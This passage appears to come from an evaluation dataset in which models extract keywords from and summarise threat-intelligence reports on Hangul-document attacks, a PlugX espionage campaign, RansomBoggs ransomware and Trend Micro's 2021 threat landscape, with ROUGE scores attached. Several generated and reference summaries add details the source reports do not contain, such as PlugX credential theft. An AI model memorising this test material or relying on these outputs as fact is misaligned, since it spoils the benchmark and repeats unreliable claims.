damages. In addition, when opening a Hangul document, users should be careful about the executable files that are embedded inside, such as links, images, movies, and documents. Attackers have been exploiting various methods of attack over the past decade. Fortunately, there is no new vulnerability to exploit and use to attack by modifying a Hangul document file. However, attacks aiming domestic users such as Hangul attacks will steadily continue.Reference[1] Korean MalDoc Drops Evil New Years Presents (url Introducing ROKRAT (url ROKRAT Reloaded (url Korea In The Crosshairs (url Flash 0-Day In The Wild: Group 123 At The Controls (url wild.html)[6] APT37 research/2018/02/apt37-overlooked-north-korean-actor.html)(Reaper): The Overlooked North Korean Actor(url\u00a9 AhnLab, Inc. All rights reserved 16 ", "generated_text": "Analysis; AhnLab; Malicious Hangul Files; use; South Korean organizations; September 2016; December 2017; vulnerabilities; JavaScript; Encapsulated PostScript; EPS; Embedded Objects; Methods; the attackers; the target; employees; North Korea; virtual currency; the malware; a backdoor; a vulnerability; the user; the memory; the attacker; response; prevention; detection; the Hangul security update; the malware; IP; attackers; the malware; execution; command; execution; a method; detection; detection; control; overview; malware attacks; malware source codes; Attack groups; Group A; Red Eyes; the \"red eyes\" group; Group B; Group C; second; the malware; a backdoor; a vulnerability; a new backdoor; the same malware.", "ref_text": "<START-1>The PDF analyzes targeted attacks against South Korean organizations from September 2016 to December 2017 using malicious Hangul document files. Hangul is a Korean proprietary word processor widely used in South Korea, especially by the government. Attackers delivered the malware via email attachments or links to malicious Hangul files hosted on remote servers. Various techniques were used including vulnerabilities, JavaScript, Encapsulated PostScript (EPS), and embedded objects. EPS attacks were the most common. AhnLab identified 3 main attack groups - Group A targeted those connected to North Korea, Group B focused on virtual currency entities, and Group C targeted a North Korean human rights group. Groups A and B were responsible for most attacks. Payloads included downloaders, backdoors, and hard drive wiping malware. Earlier attacks directly installed backdoors through Hangul exploits but recent methods run malware only in memory, likely to evade detection. No new Hangul vulnerabilities have emerged since late 2016 meaning victims can prevent attacks by patching. Embedded objects still pose a threat however. AhnLab's analysis aims to raise awareness of the ongoing threat to South Korean entities, especially government, from targeted attacks abusing the popular Hangul software. Applying the latest Hangul updates and caution around objects are recommended. <END-1>", "t5/keyword/hint_hit_precision": 0.4074074074074074, "t5/word/hint_hit_recall": 0.185, "gpt3/lexical/rouge_rouge1": 0.5157232704402516, "gpt3/lexical/rouge_rouge2": 0.189873417721519, "gpt3/lexical/rouge_rougeL": 0.2955974842767296, "gpt3/lexical/rouge_rougeLsum": 0.2955974842767296, "gpt3_generated_text": ["This article by AhnLab Security Emergency Response Center (ASEC) analyzes targeted attacks on South Korean organizations using malicious Hangul files from September 2016 to December 2017. The attackers mainly target employees of North Korea and virtual currency related businesses. The attack methods include exploiting vulnerabilities, JavaScript, Encapsulated PostScript (EPS), and embedded objects. The attackers are classified into three groups, with two actively using Hangul files. Attacks after September 2016 are mainly executed in the memory of a computer to bypass security solutions. Fortunately, there have been no new malware exploiting Hangul vulnerabilities since the second half of 2016, and users can prevent attacks by updating Hangul security. However, embedded object malware in Hangul files still poses a threat."]}, {"split_name": "val", "sample_id": "val_7", "prompt_text": "Extract the keywords: www.secureworks.com /blog/bronze-president-targets-government-officials BRONZE PRESIDENT Targets Government Officials Counter Threat Unit Research Team \u22ee \u22ee 9/8/2022The likely Chinese government-sponsored threat group uses decoy documents and PlugX malware to compromise targets. Thursday, September 8, 2022 By: Counter Threat Unit Research TeamIn June and July 2022, Secureworks\u00ae Counter Threat Unit\u2122 (CTU) researchers identified a PlugX malware campaign targeting computers belonging to government officials of several countries in Europe, the Middle East, and South America. PlugX is modular malware that contacts a command and control (C2) server for tasking and can download additional plugins to enhance its capability beyond basic information gathering. Several characteristics of this campaign indicate that it was conducted by the likely Chinese government-sponsored BRONZE PRESIDENT threat group, including the use of PlugX, file paths and naming schemes previously used by the threat group, the presence of shellcode in executable file headers, and politically-themed decoy documents that align with regions where China has interests.The malware is embedded within RAR archive files. Opening the archive on a Windows computer with default settings displays a Windows shortcut (LNK) file (see Figure 1) that masquerades as a document.Figure 1. Content of RAR archive file. (Source: Secureworks)Alongside the shortcut is a hidden folder that contains the malware, embedded eight levels deep in a sequence of hidden folders named with special characters (see Figure 2). This tiering is likely to bypass mail-scanning products that may not traverse the entire path when scanning content, suggesting that the delivery mechanism was phishing emails, as there is no other benefit to creating such a folder structure.1/11Figure 2. Malicious files contained within hidden folder. (Source: Secureworks)To execute the malware, the recipient must click the Windows shortcut file. The shortcut executes a renamed legitimate file contained in the eighth hidden folder. Alongside the legitimate file is a malicious DLL and an encrypted payload file. CTU\u2122 researchers observed the malicious payload using the folder names and filenames in Table 1.Shortcut fileHidden folder`HU proposals to the draft EUCO conclusions.pdf.lnk ` Embassy of the Republic of Suriname 2022-N- 033.pdf.lnk Predlog termina zvanicne ministara i ministarke vanjskih poslova BiH.pdf.lnk EL Non-Paper Pandemic Resilience final.docx.lnk 313615_MONTENEGRO- 2021-HUMAN-RIGHTS- REPORT.pdf.lnk EU 31st session of the Commission on Crime Prevention and Criminal Justice United Nations on Drugs and Crime.pdf.lnk NV 309-2022 HMA's departure.pdf.lnk`#####_#Legitimate binary Opera.exe (renamed test.tmp) Opera.exe (renamed mail.tmp)Malicious DLLEncryptedPlugX payloadopera_browser.dll operaDB.datopera_browser.dll operaDB.datOpera.exe (renamed test.bpl)opera_browser.dll operaDB.datAdobe Stock Photos Cs3.exe (renamed (renamed winrar.chm)Adobe_Caps.dll AdobePlugin.datGoopdate.dllAvastDB.datAvastBrowserUpdate.exe (renamed chrom.uce)Goopdate.dllAvastDB.datOpera.exe (renamed test.chm)opera_browser.dll operaDB.datTable 1. Filenames used in PlugX campaign.The legitimate binary files are vulnerable to DLL search order hijacking. When executed, they import the malicious DLL that loads, decrypts, and executes the payload file. In each sample analyzed by CTU2/11researchers, the shortcut file metadata indicates the file was created on a Windows system either with hostname \"desktop-n2v1smh\" or \"desktop-cb248vr\".Once running, the payload drops a decoy document to the logged-on user's %Temp% directory and copies the three files to a ProgramData subdirectory using the pattern \"<Application><3 characters>\" (e.g., Operavng) (see Figure 3). This naming scheme has been used in previous BRONZE PRESIDENT PlugX campaigns. CTU researchers observed that when the payload performs the copy operation, it names the legitimate executable with its usual name (e.g., Opera.exe, AdobePlugin.exe, AvastBrowser.exe).Figure 3. PlugX files copied to ProgramData subdirectory. (Source: Secureworks)The political nature of the decoy documents suggests that the government officials of various countries are targets for BRONZE PRESIDENT's intelligence collection efforts (see Figures 4, 5, and 6). The threat group consistently targets China's neighbors such as Myanmar and Vietnam. However, its collection requirements can change quickly and are often driven by geopolitical events such as the war in Ukraine.Figure 4. Decoy document used by BRONZE PRESIDENT. (Source: Secureworks)3/11Figure 5. Decoy document used by BRONZE PRESIDENT. (Source: Secureworks)Figure 6. Decoy document used by BRONZE PRESIDENT. (Source: Secureworks)PlugX sets up persistence on the host by setting a registry Run key (see Figure 7).Figure 7. PlugX registry configuration. (Source: Secureworks)4/11The running instance of the PlugX payload executes the copy of the legitimate file under ProgramData, passing it a command-line argument before exiting (see Figure 8). Passing command-line arguments lets the malware adapt its execution based on its execution location. CTU researchers observed this tactic in previous BRONZE PRESIDENT PlugX campaigns. Once running, the legitimate file again imports the malicious DLL in the same folder, loading, decoding, and passing execution to the malicious payload file.Figure 8. PlugX process execution with command-line argument. (Source: Secureworks)The payload file calls GetCommandLineW to check the number of arguments. If an additional argument follows the file path, the malware opens the decoy document previously dropped to the user's %Temp% folder and continues execution with its C2 routine.The malicious DLLs and payloads are heavily obfuscated to hinder analysis and to reduce the likelihood of detection by host-based security software. The malicious DLL executes its payload using an unusual technique. Instead of using a call or jmp instruction, it first decodes and copies the payload to a new allocation of memory and then makes a call to EnumThreadWindows to pass execution to the start of the malicious payload file (see Figure 9).Figure 9. Malicious DLL calling EnumThreadWindows. (Source: Secureworks)The start of the payload file is treated as executable code in the same way as a Cobalt Strike stageless payload artifact. This could be a tactic developed by BRONZE PRESIDENT to increase the likelihood of its malware being misidentified as the popular Cobalt Strike tool.The payload resolves various required Windows functions. It then starts a new thread that makes repeated calls to CheckRemoteDebuggerPresent, exiting if it detects a debugger.Figure 10 shows the payload preparing to decode its configuration. The values pushed to the stack are key length, key, data length, and data address. The key is used as a multibyte XOR value. All observed key value lengths are nine bytes, and their values vary across samples.5/11Figure 10. PlugX calling its configuration decode function. (Source: Secureworks)Figure 11 shows the beginning of the decoded configuration, including the installation directory, mutex name, and the name of the decoy document associated with the sample.Figure 11. PlugX configuration data. (Source: Secureworks)BRONZE PRESIDENT has demonstrated an ability to pivot quickly for new intelligence collection opportunities. Organizations in geographic regions of interest to China should closely monitor this group's activities, especially organizations associated with or operating as government agencies.To mitigate exposure to this malware, CTU researchers recommend that organizations use available controls to review and restrict access using the indicators listed in Table 2. Note that IP addresses can be reallocated. The IP addresses may contain malicious content, so consider the risks before opening them hashMalicious RAR file containing PlugX (Predlog termina zvanicne posjete zamjenice predsjedavajuceg Vijeca ministara i ministarke vanjskih poslova BiH.rar) Malicious RAR file containing PlugX (Predlog termina zvanicne posjete zamjenice predsjedavajuceg Vijeca ministara i ministarke vanjskih poslova BiH.rar) Malicious RAR file containing PlugX (Predlog termina zvanicne posjete zamjenice predsjedavajuceg Vijeca ministara i ministarke vanjskih poslova BiH.rar) Malicious shortcut file that executes PlugX (Predlog termina zvanicne posjete zamjenice predsjedavajuceg Vijeca ministara i ministarke hashMalicious shortcut file that executes PlugX (Predlog termina zvanicne posjete zamjenice predsjedavajuceg Vijeca ministara i ministarke vanjskih poslova BiH.pdf.lnk) Malicious shortcut file that executes PlugX (Predlog termina zvanicne posjete zamjenice predsjedavajuceg Vijeca ministara i ministarke vanjskih poslova BiH.pdf.lnk) Malicious DLL that loads PlugX (opera_browser.dll) Malicious DLL that loads PlugX (opera_browser.dll) Malicious DLL that loads PlugX (opera_browser.dll) Encrypted PlugX payload (operaDB.dat)Encrypted PlugX payload (operaDB.dat)Encrypted PlugX payload (operaDB.dat) Malicious RAR file containing PlugX (Embassy of the Republic of Suriname 2022-N-033.rar) Malicious RAR file containing PlugX (Embassy of the Republic of Suriname 2022-N-033.rar) Malicious RAR file containing PlugX (Embassy of the Republic of Suriname 2022-N-033.rar) Malicious shortcut file that executes PlugX (Embassy of the Republic of Suriname 2022-N- 033.pdf.lnk) Malicious shortcut file that executes PlugX (Embassy of the Republic of Suriname 2022-N- 033.pdf.lnk) Malicious shortcut file that executes PlugX (Embassy of the Republic of Suriname 2022-N- 033.pdf.lnk) Malicious DLL that loads PlugX (opera_browser.dll) Malicious DLL that loads PlugX (opera_browser.dll) Malicious DLL that loads PlugX (opera_browser.dll) Encrypted PlugX payload (operaDB.dat)Encrypted PlugX payload (operaDB.dat)Encrypted PlugX payload (operaDB.dat) Malicious RAR file containing PlugX (HU proposals to the draft EUCO conclusions.rar)7/11IndicatorType hashContextMalicious RAR file containing PlugX (HU proposals to the draft EUCO conclusions.rar) Malicious RAR file containing PlugX (HU proposals to the draft EUCO conclusions.rar) Malicious shortcut file that executes PlugX (HU proposals to the draft EUCO conclusions.pdf.lnk) Malicious shortcut file that executes PlugX (HU proposals to the draft EUCO conclusions.pdf.lnk) Malicious shortcut file that executes PlugX (HU proposals to the draft EUCO conclusions.pdf.lnk) Malicious DLL that loads PlugX (opera_browser.dll) Malicious DLL that loads PlugX (opera_browser.dll) Malicious DLL that loads PlugX (opera_browser.dll) Encrypted PlugX payload (operaDB.dat)Encrypted PlugX payload (operaDB.dat)Encrypted PlugX payload (operaDB.dat) Malicious RAR file containing PlugX (EL Non- Paper Pandemic Resilience final.rar) Malicious RAR file containing PlugX (EL Non- Paper Pandemic Resilience final.rar) Malicious RAR file containing PlugX (EL Non- Paper Pandemic Resilience final.rar) Malicious shortcut file that executes PlugX (EL Non-Paper Pandemic Resilience final.docx.lnk) Malicious shortcut file that executes PlugX (EL Non-Paper Pandemic Resilience final.docx.lnk) Malicious shortcut file that executes PlugX (EL Non-Paper Pandemic Resilience final.docx.lnk) Malicious DLL that loads PlugX (Adobe_Caps.dll) Malicious DLL that loads PlugX (Adobe_Caps.dll) Malicious DLL that loads PlugX (Adobe_Caps.dll) Encrypted PlugX payload (AdobePlugin.dat)Encrypted PlugX payload (AdobePlugin.dat)Encrypted PlugX payload (AdobePlugin.dat)8/11IndicatorType hashContextMalicious RAR file containing PlugX (313615_MONTENEGRO-2021-HUMAN- RIGHTS-REPORT.rar) Malicious RAR file containing PlugX (313615_MONTENEGRO-2021-HUMAN- RIGHTS-REPORT.rar) Malicious RAR file containing PlugX (313615_MONTENEGRO-2021-HUMAN- RIGHTS-REPORT.rar) Malicious shortcut file that executes PlugX (313615_MONTENEGRO-2021-HUMAN- RIGHTS-REPORT.pdf.lnk) Malicious shortcut file that executes PlugX (313615_MONTENEGRO-2021-HUMAN- RIGHTS-REPORT.pdf.lnk) Malicious shortcut file that executes PlugX (313615_MONTENEGRO-2021-HUMAN- RIGHTS-REPORT.pdf.lnk) Malicious DLL that loads PlugX (goopdate.dll)Malicious DLL that loads PlugX (goopdate.dll)Malicious DLL that loads PlugX (goopdate.dll)Encrypted PlugX payload (AvastDB.dat)Encrypted PlugX payload (AvastDB.dat)Encrypted PlugX payload (AvastDB.dat) Malicious RAR file containing PlugX (EU 31st session of the Commission on Crime Prevention and Criminal Justice United Nations on Drugs and Crime.rar) Malicious RAR file containing PlugX (EU 31st session of the Commission on Crime Prevention and Criminal Justice United Nations on Drugs and Crime.rar) Malicious RAR file containing PlugX (EU 31st session of the Commission on Crime Prevention and Criminal Justice United Nations on Drugs and Crime.rar) Malicious shortcut file that executes PlugX (EU 31st session of the Commission on Crime Prevention and Criminal Justice United Nations on Drugs and Crime.pdf.lnk) Malicious shortcut file that executes PlugX (EU 31st session of the Commission on Crime Prevention and Criminal Justice United Nations on Drugs and Crime.pdf.lnk)9/11IndicatorTypeContextMalicious shortcut file that executes PlugX (EU 31st session of the Commission on Crime Prevention and Criminal Justice United Nations on Drugs and Crime.pdf.lnk) Malicious DLL that loads PlugX (goopdate.dll)Malicious DLL that loads PlugX (goopdate.dll)Malicious DLL that loads PlugX (goopdate.dll)Encrypted PlugX payload (AvastDB.dat)Encrypted PlugX payload (AvastDB.dat)Encrypted PlugX payload (AvastDB.dat) Malicious RAR file containing PlugX (NV 309- 2022 HMA's departure.pdf.rar) Malicious RAR file containing PlugX (NV 309- 2022 HMA's departure.pdf.rar) Malicious RAR file containing PlugX (NV 309- 2022 HMA's departure.pdf.rar) Malicious shortcut file that executes PlugX (NV 309-2022 HMA's departure.pdf.lnk) Malicious shortcut file that executes PlugX (NV 309-2022 HMA's departure.pdf.lnk) Malicious shortcut file that executes PlugX (NV 309-2022 HMA's departure.pdf.lnk) Malicious DLL that loads PlugX (opera_browser.dll) Malicious DLL that loads PlugX (opera_browser.dll) Malicious DLL that loads PlugX (opera_browser.dll) address PlugX C2 server IP address PlugX C2 server IP ", "generated_text": "research; PlugX malware; target; government officials; Europe; the Middle East; South America; the malware; RAR archive files; a shortcut; the shortcut; a hidden folder; hidden folders; DLL; download; additional plugins; access; command; control; server; tasking; phishing emails; content; the campaign; analysis; the use; shellcode; initial access; a decoy document; the payload; the C2 server; credentials; DLL search order hijacking; the C2 server; the target.", "ref_text": "<START-1>The PDF describes research from Secureworks on a cyberespionage campaign targeting government officials in Europe, the Middle East, and South America. The threat actor uses Windows shortcut files contained in RAR archives that execute PlugX malware when opened. PlugX is a modular malware that can download additional plugins to enhance its capabilities beyond basic information gathering. The malware is embedded within RAR archive files and drops a decoy document to the logged-on user's %Temp% directory when executed. Analysis of the malware attributes the campaign to BRONZE PRESIDENT, a Chinese state-sponsored group. Tactics align with previous BRONZE PRESIDENT activity, including decoy documents about political issues, file paths, shellcode obfuscation, and PlugX modules. The malware achieves persistence using Run registry keys and credential theft for lateral movement. Network traffic goes to command and control servers hosted on infrastructure previously linked to BRONZE PRESIDENT. The decoy documents suggest the group is gathering intelligence on China's interests in the targeted regions. The malware evolves over time and BRONZE PRESIDENT continuously pivots to new targets for fresh intelligence requirements. The payload copies three files to a ProgramData subdirectory using a naming scheme unique to previous BRONZE PRESIDENT campaigns. The report concludes that government entities, especially those related to China's geopolitical interests, should closely monitor BRONZE PRESIDENT. Protection requires proactive threat hunting, restricting access to indicators of compromise, and updating defenses against PlugX malware. <END-1>", "t5/keyword/hint_hit_precision": 0.5714285714285714, "t5/word/hint_hit_recall": 0.14912280701754385, "gpt3/lexical/rouge_rouge1": 0.4597701149425287, "gpt3/lexical/rouge_rouge2": 0.17341040462427743, "gpt3/lexical/rouge_rougeL": 0.2413793103448276, "gpt3/lexical/rouge_rougeLsum": 0.2413793103448276, "gpt3_generated_text": ["In a recent campaign targeting government officials in Europe, the Middle East, and South America, researchers identified the use of PlugX malware by the likely Chinese government-sponsored BRONZE PRESIDENT threat group. The malware was delivered through RAR archive files containing a Windows shortcut file that disguised the malicious payload hidden within multiple levels of folders. Once executed, the malware downloaded additional plugins and communicated with a command and control server for tasking. The payload also dropped decoy documents and utilized DLL search order hijacking to access credentials on the compromised systems. The campaign's delivery mechanism appeared to be phishing emails, highlighting the sophistication of the threat group's tactics in targeting government officials."]}, {"split_name": "val", "sample_id": "val_8", "prompt_text": "Extract the keywords: thehackernews.com /2022/11/russia-based-ransomboggs-ransomware.html Russia-based RansomBoggs Ransomware Targeted Several Ukrainian OrganizationsUkraine has come under a fresh onslaught of ransomware attacks that mirror previous intrusions attributed to the Russia-based Sandworm nation-state group.Slovak cybersecurity company ESET, which dubbed the new ransomware strain RansomBoggs, said the attacks against several Ukrainian entities were first detected on November 21, 2022.\"While the malware written in .NET is new, its deployment is similar to previous attacks attributed to Sandworm,\" the company said in a series of tweets Friday.The development comes as the Sandworm actor, tracked by Microsoft as Iridium, was implicated for a set of attacks aimed at transportation and logistics sectors in Ukraine and Poland with another ransomware strain called Prestige in October 2022.The RansomBoggs activity is said to employ a PowerShell script to distribute the ransomware, with the former \"almost identical\" to the one used in the Industroyer2 malware attacks that came to light in April.1/2According to the Computer Emergency Response Team of Ukraine (CERT-UA), the PowerShell script, named POWERGAP, was leveraged to deploy a data wiper malware called CaddyWiper using a loader dubbed ArguePatch (aka AprilAxe).ESET's analysis of the new ransomware shows that it generates a randomly generated key and encrypts files using AES-256 in CBC mode and appends the \".chsch\" file extension.Sandworm, an elite adversarial hacking group within Russia's GRU military intelligence agency, has a notorious track record of striking critical infrastructure over the years.The threat actor has been linked to the NotPetya cyberattacks against hospitals and medical facilities in 2017 and the destructive assaults against the Ukrainian electrical power grid in 2015 and 2016.2/2 ", "generated_text": "ransomware attacks; Ukraine; Sandworm; Sandworm; the group; a PowerShell script; the ransomware; AES-256; CBC mode; AprilAxe; CaddyWiper; ArguePatch; AprilAxe; the malware; documents; files; C2; the malware; exploits; tools; a PowerShell script; PowerGAP; Industroyer; Trojan; the ransomware; update; the Sandworm group; infrastructure; two recent attacks; transportation and logistics sectors; Poland; Industroyer2; the same group; Iridium; the Sandworm group.", "ref_text": "<START-1>A new ransomware strain called RansomBoggs has been used in recent attacks against Ukrainian organizations. The attacks were first detected on November 21, 2022 and have similarities to previous intrusions attributed to the Russia-based Sandworm hacking group. RansomBoggs uses a PowerShell script to distribute the ransomware, which is nearly identical to the one used by the Industroyer2 malware earlier this year. The ransomware generates an encryption key, encrypts files using AES-256 algorithm, and appends the .chsch extension to encrypted files. Sandworm is an elite Russian state-sponsored hacking group within the GRU military intelligence agency linked to past attacks on Ukrainian critical infrastructure. The similarities in tactics and infrastructure suggest RansomBoggs could be the latest ransomware operation conducted by Sandworm against Ukrainian targets. <END-1>", "t5/keyword/hint_hit_precision": 0.2, "t5/word/hint_hit_recall": 0.08196721311475409, "gpt3/lexical/rouge_rouge1": 0.5677966101694916, "gpt3/lexical/rouge_rouge2": 0.24786324786324784, "gpt3/lexical/rouge_rougeL": 0.3559322033898306, "gpt3/lexical/rouge_rougeLsum": 0.3559322033898306, "gpt3_generated_text": ["The article discusses a new ransomware strain named RansomBoggs that has recently targeted several Ukrainian organizations. This ransomware, attributed to the Russia-based Sandworm group, is distributed using a PowerShell script called POWERGAP and encrypts files using AES-256 in CBC mode, appending the \".chsch\" extension. The attacks are similar to previous intrusions by the Sandworm group, including the use of tools like CaddyWiper and ArguePatch (AprilAxe). Sandworm, known for targeting critical infrastructure, was also implicated in recent attacks on the transportation and logistics sectors in Ukraine and Poland using a ransomware strain called Prestige. This highlights the ongoing threat posed by the Sandworm group to Ukrainian organizations and critical infrastructure."]}, {"split_name": "val", "sample_id": "val_9", "prompt_text": "Extract the keywords: Navigating New FrontiersTrend Micro 2021 Annual Cybersecurity ReportContents 4 Modern Ransomware Actors Continue to Target Critical Industries9 Cloud Adopters and Remote Workers Contend With Rising Threats to Cloud Environments16 Targeted Attacks Take Aim at Bigger Game With Upgraded Arsenal20 Rising Vulnerabilities Leave Unpatched Systems Exposed to More Risks26 Pandemic-Related Threats Evolve and Continue to Plague Remote Workers30 Increasingly Sophisticated Threats Call for Robust and Multilayered Defense32 The Threat Landscape in BriefPublished by Trend Micro ResearchStock image used under license from Shutterstock.comIn 2021, the fast-tracked digital transformations that enabled the continuity of many organizations also opened them up to a slew of threats both old and new, as cybercriminals proved savvy to opportunities for abuse and attack, including those that had emerged since the onset of the Covid-19 pandemic.Modern ransomware actors grew more ambitious and deliberate with their attacks, and set their sights on more profitable targets. Going beyond indiscriminately going after their victims, operators running ransomware families like REvil1 and Conti2 eschewed automated attacks in favor of a more hands-on, long-haul approach to carefully tailor their campaigns to entities in critical industries.Targeted attacks gained popularity among different kinds of malicious actors, including those in cyberespionage and cybermercenary groups, who were armed with upgraded toolboxes that made their operations even more effective. Attacks from the likes of Void Balaur3 and Tropic Trooper4 demonstrated how these groups were capable of developing customized tools and were adept at red teamwork. Phishing scams remained a staple in these cyberattacks, in part because the influx of news about the global pandemic gave malicious actors ideas for new lures that resonated with a wider pool of potential victims.Any cracks in an organization\u2019s security posture could be devastating for business continuity, as could be seen from the rise in and impact of critical vulnerabilities in 2021. The growth of the underground exploit market proved that, left unpatched, older flaws could still inflict as much damage on infected systems as newly discovered ones. Malicious actors continued to employ flaws both old and new in their campaigns, as in the Squirrelwaffle loader\u2019s use of the ProxyLogon and ProxyShell vulnerabilities,5 and the Khonsari ransomware attacks that incorporated the Log4Shell vulnerability.6Pressing security issues also continued to plague organizations-turned-cloud-adopters. Most of the challenges in cloud security in 2021 could be attributed to misconfigurations in the setup of cloud environments, as evidenced by how TeamTNT abused incorrectly configured servers to compromise Docker Hub accounts. TeamTNT was one of the first cybercriminal groups to focus primarily on cloud service providers (CSPs), signaling a growing interest in the cloud within cybercriminal circles.From large-scale ransomware campaigns to high-risk vulnerabilities, the far-reaching impact of these security incidents showed that no user, enterprise, or industry was immune to compromise. The massive disruptions caused by high-profile attacks underscored the need for visibility over the ever- evolving attack surface across an organization\u2019s entire digital infrastructure. The defenses that might have sufficed in a prepandemic world stood to be reevaluated, if not redefined, in the face of mounting risks that could be averted only by an adaptive threat monitoring, detection, and response strategy with which organizations could continuously assess and enhance their security postures.This annual cybersecurity report explores the notable events and emerging trends that shaped the cybersecurity landscape of 2021, during which Trend Micro protected its customers from over 94 billion threats. We hope that this roundup can provide organizations and end users alike with valuable insights they can use to make informed decisions about their security infrastructure and policies as they navigate and move forward in an ever-changing threat landscape.Modern Ransomware Actors Continue to Target Critical IndustriesOver the years, we have observed how ransomware has evolved significantly. In 2018, a spray-and-praystrategy was the norm among malicious actors, who wanted to profit from as many victims as possible.7However, our researchers foresaw how ransomware operators would pivot away from such a quantity-based tactic and become more deliberate in their movements.8 Notably, in 2021 ransomware operatorsstaged attacks on more profitable targets, leading to business disruptions with real-world ramificationsfelt on a global scale.9Already strained by the pandemic, healthcare organizations were hit hard by ransomware attacks in 2021,which were just behind the banking and government industries in terms of ransomware detections. A2021 report suggests that because healthcare organizations are less likely to back up their data thanthose in other industries, they are more prone to paying the demands of ransomware actors.10 Moreover,the healthcare industry has a trove of data that attackers seek to sell or use for extortion, including patientrecords with social security numbers, medical histories, and financial information.112020202120,98615,2347,768BankingGovernmentManufacturing19,57016,89412,477GovernmentBankingHealthcare05K10K15K20K25K05K10K15K20K25KFigure 1. The top three industries in terms of ransomware file detections in 2021 and 2020Source: Trend Micro Smart Protection Network4 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportAttempted WannaCry infections topped the list of ransomware detections across all three of the mostaffected industries, outpacing other ransomware families by a wide margin. The spray-and-pray approachused by legacy ransomware like WannaCry might account for its large volume of attacks, but notably,modern ransomware gained ground.GovernmentWannaCry 16,969Banking WannaCry 15,640HealthcareWannaCry 4,930GandCrab96GandCrab103LockBit550Cerber86MountLocker66Maze33805K10K15K20K05K10K15K20K05K10K15K20KFigure 2. The top three ransomware families that affected the top three affected industries in 2021Source: Trend Micro Smart Protection NetworkUnlike their premodern counterparts, modern ransomware groups displayed erratic activity as they closedin on specific targets rather than cast a wide net,12 which is most likely why we observed a 21% decreasein overall ransomware detections in 2021. We observed several modern ransomware groups ramp up theiractivities last year: Year-on-year detections of REvil (also known as Sodinokibi) soared by 143%, therewere over 20 times as many detections of LockBit in 2021 as there were in 2020, and detections of Contirose more than ninefold from the previous year.20202021REvilLockBitConti2,2785,535 1272,7121831,760143%2,035%862%01K2K3K4K5K6KFigure 3. A year-on-year comparison of the top three modern ransomware familiesin terms of file detections in 2020 and 2021Source: Trend Micro Smart Protection Network5 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportAnother factor that might have played into the decline in ransomware detections was the marked increasein our detections and blocking of malware tools like the Cobalt Strike beacon CoBeacon, the trojanTrickbot, and the information stealer BazarLoader. Our blocking of larger numbers of these affiliate toolsmight have prevented ransomware operators from staging full-blown attacks in 2021, as the presence ofsuch tools is an early indicator of infection. In 2021, there was an eightfold rise in detections of CoBeacon,which had been abused by operators of ransomware families such as DoppelPaymer, Povlsomware, andRyuk.13 Detections of Trickbot, which had been linked to the Conti ransomware14 as well as Ryuk,15 sawa 23% year-on-year increase. Most notably, detections in 2021 of BazarLoader, which had been used togain initial access to systems by the likes of Conti16 and Ryuk,17 were up by 2,468% from the previous year.Because modern ransomware has more human involvement, collaboration among cybercriminals hasgained traction in the underground, as evidenced by the rising trend of ransomware-as-a-service (RaaS).RaaS affiliate programs have been beneficial for all cybercriminal parties involved: By bringing partnersonboard to divide the labor, ransomware actors can more efficiently profit from a victim\u2019s compromisedassets.18 The proliferation of RaaS has not only made ransomware more accessible even to maliciousactors with limited technical knowledge but also given rise to higher specialization within the cybercrimeecosystem. In splitting the work among themselves, RaaS affiliates have been able to hone their skills andfocus on certain specialties like penetrating networks or running the malware.19The widespread use of RaaS is a result of the ongoing evolution of the flourishing cybercrime-as-a-servicemarket, which continues to develop new business models for attackers. One such development is thegrowing demand for access-as-a-service (AaaS), with access brokers peddling stolen credentials in thecriminal underground and finding reliable customers in ransomware actors, who use their wares to infecttarget systems.20Another trend that has caught on within cybercriminal circles is the incorporation of double extortion, inwhich ransomware actors not only demand a sum to restore access to a victim\u2019s encrypted files but alsothreaten to release the sensitive data upon failure of payment. This tactic was first perpetrated in 2019 bythe Maze ransomware and has since become even more widely used. As of June 2021, as many as 35ransomware families employed double extortion. Some, including REvil and Conti, augmented their RaaSoperations with this extortion technique to pursue big-name targets.21Since it was discovered by Cisco Talos in 2019, REvil has become one of the most active RaaS families.22In 2021, it continued its use of double extortion on multinational enterprises like Apple,23 JBS,24 andKaseya25 to great effect. The bulk of REvil attacks took place in the US, but countries like Mexico andGermany were also affected.6 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportBased on our telemetry, REvil attacks were aimed at critical industries. Most were levied against thetransportation industry, followed by organizations in the financial and the oil and gas industries. In ourreport on ransomware activity during the first half of 2021, we posited that the transportation industrybore the brunt of REvil attacks likely because it played an important part in global supply chains andlogistics.26REvil\u2019s customized attacks suggest that its operators have extensive knowledge of their targets\u2019 ITenvironments. The efficiency of REvil can also be attributed to its diverse toolbox. This includes the useof Qakbot, AdFind, BloodHound, and other third-party sync tools, and the exploitation of vulnerabilitieslike CVE-2021-30116, which affects Kaseya VSA servers; CVE-2019-2725, a deserialization vulnerabilityin Oracle WebLogic; the FortiGate SSL VPN flaw CVE-2018-13379; and the Pulse Secure SSL VPNvulnerability CVE-2019-11510.27Initial accessRDP/Valid accountsExploitSpam emailExecution and lateral movementPsExecDefense evasion,discoveryPC HunterREvil/SodinokibiransomwareProcess HackerDownload and executionKillAVDrive-by compromiseCertUtilPowerShellMacroFigure 4. REvil\u2019s infection chainAnother notorious RaaS, called Conti, which we believe to be a successor of Ryuk, was behind manydebilitating attacks around the world in 2021.28 In the US alone, there were more than a million Contiattacks between January 1 and November 12, 2021.29 As noted in our 2021 midyear cybersecurity report,this modern ransomware family had the tenth highest number of attack attempts during the first half of2021.30 The bulk of these occurred in the US, followed by the Netherlands and Taiwan. Retail organizationsexperienced the most Conti attacks. The insurance, manufacturing, and telecommunications industrieswere also hit hard, but Conti\u2019s high-profile attacks on healthcare organizations was what made majorheadlines last year.317 | Navigating New Frontiers: Trend Micro 2021 Annual Cybersecurity ReportLike REvil\u2019s, Conti\u2019s operators also take advantage of double extortion, threatening to release stolendata and selling access to infected systems if their victims fail to pay the ransom. They employ a varietyof exploits, such as those of the PrintNightmare and Zerologon vulnerabilities, and tools and malware,including familiar names like BazarLoader, Cobalt Strike, Mimikatz, and Rclone. Working in concert,these enable Conti operators to gain remote access to a targeted system, disable the system\u2019s securitysoftware, locate and exfiltrate valuable data, and encrypt files to make them inaccessible until the ransomdemand is met.Initial entry and executionPrivilege escalationCommand and controlFirewall exploitCobalt StrikePrintNightmareZerologonValid accountsAnyDeskPhishing emailBazarLoader/ BazarBackdoorCredential accessLateral movementNetwork 